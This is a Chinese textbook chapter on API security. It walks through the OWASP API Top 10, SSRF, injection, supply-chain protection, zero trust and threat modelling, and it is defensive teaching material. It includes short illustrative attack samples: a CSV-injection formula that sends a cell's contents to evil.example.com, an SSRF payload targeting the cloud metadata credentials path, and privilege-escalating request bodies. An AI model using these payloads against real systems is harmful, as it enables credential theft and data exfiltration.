# 第 20 章 安全纵深：OWASP API Top 10 与供应链

## 20.1 API 安全的特殊性

传统 Web 安全关注页面、表单和会话；API 安全关注：

- 每个端点的输入与输出；
- 对象级权限；
- 机器调用与自动化；
- 令牌与密钥；
- 高并发与资源消耗；
- 第三方集成；
- 数据批量导出；
- 影子 API；
- 机器消费者（Agent）。

API 没有“页面”这层天然保护，攻击者可以直接构造请求、枚举 ID、批量调用。

### API 攻击者的视角

攻击者通常按以下顺序尝试：

1. 发现 API（文档、JS、移动端、DNS、错误信息）；
2. 枚举端点与版本；
3. 获取或猜测令牌；
4. 枚举资源 ID；
5. 尝试越权（BOLA/BFLA）；
6. 尝试字段级越权；
7. 滥用业务流（注册、优惠券、短信）；
8. 资源耗尽；
9. SSRF/注入；
10. 供应链。

安全设计应假设每一步都可能被尝试。

## 20.2 OWASP API Security Top 10（2023）

### API1：Broken Object Level Authorization（BOLA）

最常见的 API 漏洞。攻击者修改资源 ID，访问他人资源。

```http
GET /invoices/inv_123
Authorization: Bearer <user_A_token>
```

如果服务端只验证令牌有效，没有验证 `inv_123` 属于用户 A，就会泄露。

防护：

- 每个对象访问都检查所有权/租户；
- 使用授权服务或数据层 RLS；
- 不要只依赖“前端不显示”；
- 自动化越权测试；
- 使用不可枚举 ID（但不是授权机制）；
- 对列表和单对象都检查。

### API2：Broken Authentication

弱认证、令牌泄露、缺少校验。

防护：

- 用户认证用 OIDC，不要用 OAuth 2.1 代替认证；
- 委托授权用 OAuth 2.1 + PKCE；
- 机器认证用 client credentials、API Key 或 mTLS，不要把用户流程套给服务；
- 短期令牌；
- 严格校验签名、`iss`、`aud`、`exp`；
- 多因素认证；
- 密钥轮换；
- 防暴力破解；
- 不在 URL/日志泄露令牌；
- 令牌绑定（DPoP/mTLS）。

### API3：Broken Object Property Level Authorization

字段级越权：能读/写不该读写的字段。

读取越权：

```json
{
  "id": "user_123",
  "email": "alice@example.com",
  "ssn": "123-45-6789",
  "internalRiskScore": 87
}
```

写入越权（mass assignment）：

```json
{
  "name": "Alice",
  "role": "admin",
  "balance": 999999
}
```

防护：

- 输入白名单（防 mass assignment）；
- 输出字段过滤；
- 字段级权限；
- 不直接序列化数据库对象；
- 使用 DTO；
- 对不同角色返回不同表示。

### API4：Unrestricted Resource Consumption

没有限制请求大小、频率、并发、复杂度，导致资源耗尽或成本爆炸。

防护：

- 请求体大小限制；
- 分页上限；
- 超时；
- 限流/配额；
- 查询复杂度限制；
- 成本预算；
- 批处理上限；
- 嵌套深度限制；
- 数组长度限制；
- 文件大小限制；
- 导出配额。

### API5：Broken Function Level Authorization

普通用户可以调用管理员端点。

```http
POST /admin/users/123/role
Authorization: Bearer <normal_user_token>
```

防护：

- 默认拒绝；
- 端点级权限；
- 角色/策略；
- 管理面与数据面分离；
- 测试每个角色的可访问端点；
- 不在前端隐藏作为唯一保护；
- 管理端点独立域名/网络。

### API6：Unrestricted Access to Sensitive Business Flows

业务逻辑滥用：批量注册、撞库、抢购、短信轰炸、优惠券刷取。

防护：

- 业务速率限制；
- 人机验证；
- 设备指纹/风险评分；
- 幂等与防重放；
- 异常检测；
- 业务规则（如每用户每日限额）；
- 人工审核。

### API7：Server-Side Request Forgery（SSRF）

API 接受 URL 并让服务端请求，攻击者诱导访问内网元数据、数据库、管理接口。

```json
{
  "imageUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

防护：

- URL 白名单；
- 禁止内网 IP/元数据地址；
- DNS 重绑定防护；
- 出网代理；
- 不跟随任意重定向；
- 限制协议（仅 https）；
- 超时与响应大小限制；
- 解析后校验 IP，而不是只校验域名。

### API8：Security Misconfiguration

- 默认配置；
- 调试端点暴露；
- CORS 过宽；
- 详细错误；
- 未启用 TLS；
- 公开存储桶；
- 默认密钥；
- 不必要的 HTTP 方法；
- 目录列表；
- 管理接口暴露公网。

防护：

- 基础设施即代码；
- 安全基线；
- 配置扫描；
- 最小权限；
- 生产环境关闭调试；
- CORS 白名单；
- 定期审计。

### API9：Improper Inventory Management

不知道有哪些 API、哪些版本、哪些环境在运行。

防护：

- API 目录；
- 自动发现；
- 版本/环境清单；
- 废弃端点下线；
- 影子 API 检测；
- 网关统一入口；
- 文档与代码同步。

### API10：Unsafe Consumption of APIs

过度信任第三方 API 的响应。

防护：

- 校验第三方数据；
- 限制响应大小；
- 超时；
- 不盲目转发；
- 供应链风险评估；
- 契约测试；
- 失败隔离。

## 20.3 输入安全

- 白名单校验；
- 类型/长度/范围；
- 拒绝未知字段（或明确忽略策略）；
- 防注入（SQL/NoSQL/命令/LDAP）；
- 防路径穿越；
- 防 XXE；
- 防反序列化漏洞；
- 限制嵌套深度；
- 限制数组大小；
- 限制字符串长度；
- 限制数字范围；
- 校验编码。

### Mass Assignment

```json
{
  "name": "Alice",
  "role": "admin",
  "balance": 999999
}
```

如果服务端直接把请求体映射到模型，攻击者可以提升权限或修改余额。

防护：

- 显式 DTO；
- 字段白名单；
- 禁止客户端设置敏感字段；
- 使用不同的创建/更新模型；
- 不要使用 ORM 的自动绑定；
- 审计敏感字段变更。

### 注入

- SQL：参数化查询；
- NoSQL：类型校验、禁止操作符注入；
- 命令：避免拼接，使用参数数组；
- LDAP：转义；
- 模板：沙箱；
- 日志：防日志注入（换行）；
- HTTP 头：防 CRLF 注入。

### 反序列化

不要反序列化不可信数据：

- Java 反序列化；
- Python pickle；
- YAML unsafe load；
- 自定义二进制格式。

使用：

- JSON；
- 明确 schema；
- 白名单类；
- 签名校验。

## 20.4 输出安全

- 不返回内部字段；
- 不返回堆栈；
- 不返回其他用户数据；
- 敏感字段脱敏；
- 错误信息最小化；
- 防止批量导出滥用；
- 内容类型正确；
- 防止 XSS（如果 API 返回 HTML）；
- 防止 CSV 注入；
- 防止 JSON 劫持（旧浏览器）。

### CSV 注入

导出 CSV 时，字段以 `=`、`+`、`-`、`@` 开头可能被 Excel 执行公式：

```text
=HYPERLINK("http://evil.example.com?data="&A1)
```

防护：

- 前置单引号；
- 转义危险字符；
- 或使用其他格式。

### 输出字段控制

- 使用 DTO/序列化白名单；
- 不同角色不同表示；
- 默认不返回敏感字段；
- 日志不记录敏感字段；
- 导出按权限过滤。

## 20.5 SSRF 深度防护

```text
用户提交 URL → 解析 → 检查协议 → 解析 DNS → 检查 IP → 建立连接
```

风险点：

- DNS 重绑定；
- 重定向到内网；
- IPv6/十进制 IP 绕过；
- 云元数据地址 `169.254.169.254`；
- 内部服务名；
- 文件协议；
- `localhost`；
- 私有 IP 段；
- 容器网络。

建议：

- 出网代理；
- 域名白名单；
- 禁止私有 IP 段；
- 固定 DNS 解析结果；
- 禁止重定向；
- 超时与响应大小限制；
- 只允许 https；
- 不返回原始响应（防止探测）。

### DNS 重绑定

攻击者控制域名，第一次解析到公网 IP，第二次解析到内网 IP。防护：

- 解析一次，固定 IP；
- 连接时使用固定 IP；
- 校验 IP 在允许范围；
- 使用出网代理。

## 20.6 密钥与供应链

### 密钥管理

- 不把密钥提交到代码仓库；
- 使用 Secret Manager；
- 最小权限；
- 定期轮换；
- 环境隔离；
- 审计访问；
- 扫描泄露；
- 密钥加密存储；
- 不在日志/错误中输出；
- 支持吊销；
- 使用短期凭证。

### 供应链

- 依赖锁定；
- SBOM；
- 漏洞扫描；
- 签名验证；
- 构建可复现；
- 最小基础镜像；
- 限制 CI 权限；
- 第三方 API 风险评估；
- 依赖来源审计；
- 供应链攻击检测。

### 供应链验证流水线

只有“扫描了漏洞”还不够。一个可验证的流水线至少包括：

```text
源码提交
  → 构建（隔离、可复现）
  → 生成 SBOM（SPDX/CycloneDX）
  → 生成 SLSA provenance
  → 用 Sigstore/cosign 签名镜像与 SBOM
  → 推送到私有 registry
  → 部署时 admission controller 验证签名与 provenance
  → 运行时持续扫描与告警
```

每一步的失败策略要明确：

| 阶段 | 失败时 |
|---|---|
| 依赖解析 | 阻断构建；禁止未知来源 |
| SBOM 生成 | 阻断发布；没有 SBOM 不得上线 |
| 漏洞扫描 | 按严重度阻断或开例外，例外有期限与负责人 |
| 签名 | 阻断推送 |
| provenance 校验 | 阻断部署 |
| 运行时扫描 | 告警、隔离、回滚 |

依赖混淆（dependency confusion）是一个典型攻击：

```text
内部包名：@company/http-client
攻击者在公共 registry 注册同名包，版本号更高
构建系统未锁定 registry，拉取了公共恶意包
```

防护：

- 私有 registry 优先，公共 registry 只读镜像；
- 作用域包（scoped package）与 registry 配置锁定；
- 依赖锁定文件 + 完整性哈希；
- 依赖白名单与来源审计；
- CI 中禁止运行时动态安装；
- 对新依赖做人工评审；
- 监控异常发布与版本跳跃。

供应链安全的信任根不是“扫描报告”，而是“构建来源可验证、产物可签名、部署可拒绝”。

### 典型供应链风险

- 恶意 npm/pip 包；
- 依赖混淆；
- 构建系统被入侵；
- 镜像篡改；
- CI 令牌泄露；
- 第三方 SDK 后门。

### 防护

- 私有 registry；
- 依赖白名单；
- 签名验证；
- 最小权限；
- 构建隔离；
- 产物签名；
- 运行时监控。

## 20.7 零信任

零信任的核心：

- 不信任网络位置；
- 每个请求都认证与授权；
- 最小权限；
- 持续验证；
- 假设已被入侵；
- 分段；
- 加密所有流量。

API 设计体现：

- mTLS/工作负载身份；
- 细粒度授权；
- 短令牌；
- 服务间显式契约；
- 审计；
- 分段；
- 不依赖 VPN。

### 零信任的落地难点

- 身份体系；
- 证书管理；
- 策略管理；
- 可观测性；
- 遗留系统；
- 性能；
- 组织协作。

## 20.8 威胁建模

使用 STRIDE：

| 威胁 | 问题 | API 例子 |
|---|---|---|
| Spoofing | 冒充身份 | 伪造令牌 |
| Tampering | 篡改数据 | 修改请求参数 |
| Repudiation | 否认操作 | 缺少审计 |
| Information Disclosure | 信息泄露 | 越权读取 |
| Denial of Service | 拒绝服务 | 无限分页 |
| Elevation of Privilege | 提权 | mass assignment |

对每个端点问：

- 谁能调用？
- 能传什么？
- 能读什么？
- 失败会怎样？
- 被滥用会怎样？
- 依赖被攻破会怎样？
- 数据泄露会怎样？

### 威胁建模的输出

- 威胁清单；
- 风险等级；
- 防护措施；
- 测试用例；
- 责任人；
- 复查时间。

## 20.9 安全头与传输

- 强制 HTTPS；
- HSTS；
- TLS 1.2+；
- 安全 cipher；
- CORS 白名单；
- CSP（如果返回 HTML）；
- `X-Content-Type-Options: nosniff`；
- 不暴露 `Server` 版本；
- `Referrer-Policy`；
- `Permissions-Policy`；
- 证书透明日志；
- OCSP stapling。

### CORS

- 不要 `Access-Control-Allow-Origin: *` 配合凭证；
- 白名单；
- 限制方法/头；
- 预检缓存；
- 不要反射 Origin 而不校验。

### TLS

- 禁用旧版本；
- 禁用弱 cipher；
- 证书轮换；
- 监控过期；
- HSTS；
- 内部流量也加密。

## 20.10 审计与事件响应

- 记录敏感操作；
- 日志防篡改；
- 保留期；
- 告警；
- 泄露响应流程；
- 密钥吊销；
- 客户通知；
- 复盘；
- 法律/合规配合；
- 取证。

### 事件响应步骤

```text
1. 检测
2. 遏制
3. 根除
4. 恢复
5. 通知
6. 复盘
7. 改进
```

### 审计日志的要素

- 谁；
- 什么；
- 何时；
- 从哪；
- 结果；
- 请求 ID；
- 租户；
- 策略版本。

## 20.11 安全测试

- SAST/DAST；
- 依赖扫描；
- 容器扫描；
- 越权测试；
- 模糊测试；
- 渗透测试；
- 红队；
- 威胁建模；
- 安全冠军制度；
- 安全回归测试。

### 安全测试矩阵

| 测试 | 目标 | 频率 |
|---|---|---|
| SAST | 代码漏洞 | 每次提交 |
| DAST | 运行时漏洞 | 每日/发布前 |
| 依赖扫描 | 已知漏洞 | 每日 |
| 越权测试 | BOLA/BFLA | 每次发布 |
| 模糊测试 | 输入边界 | 持续 |
| 渗透测试 | 整体安全 | 季度/年 |
| 红队 | 实战攻击 | 年 |

## 20.12 本章小结

- API 安全的核心是对象级授权、字段级授权和资源消耗控制。
- OWASP API Top 10 提供了实用的风险清单。
- 输入白名单、输出过滤、SSRF 防护、密钥管理缺一不可。
- 供应链安全需要 SBOM、签名、扫描和最小权限。
- 零信任要求每个请求都验证。
- 威胁建模应成为设计流程的一部分。
- 安全测试应覆盖越权、模糊、渗透和供应链。
- 把 GDPR、DORA、NIS2、EU Data Act、AI Act 等义务映射到 API 能力与审计证据，见[附录 T](../appendices/t-compliance-engineering.md)。
- 消息签名、令牌约束、密钥生命周期与后量子迁移，见[附录 AD](../appendices/ad-cryptography-pqc.md)。
- 数据库直出、BaaS 与自动生成接口的攻击面（RLS 绕过、service_role 泄露、列级越权），见[附录 AF](../appendices/af-database-as-api-baas.md)。
- 认证与授权正确，不代表输出不会泄露个体；差分隐私、聚合抑制与 PET 的边界，见[附录 AG](../appendices/ag-privacy-enhancing-tech.md)。

## 设计练习

对一个“文件转换 API”做 STRIDE 威胁建模：

- 用户上传 URL；
- 服务端下载并转换；
- 返回结果；
- 支持回调。

列出至少 12 个威胁与对应的防护措施。然后回答：

1. 如何防止 SSRF 访问云元数据？
2. 转换服务被攻破后，如何限制影响？
3. 回调 URL 如何防止被滥用？
4. 如何证明转换结果没有被篡改？
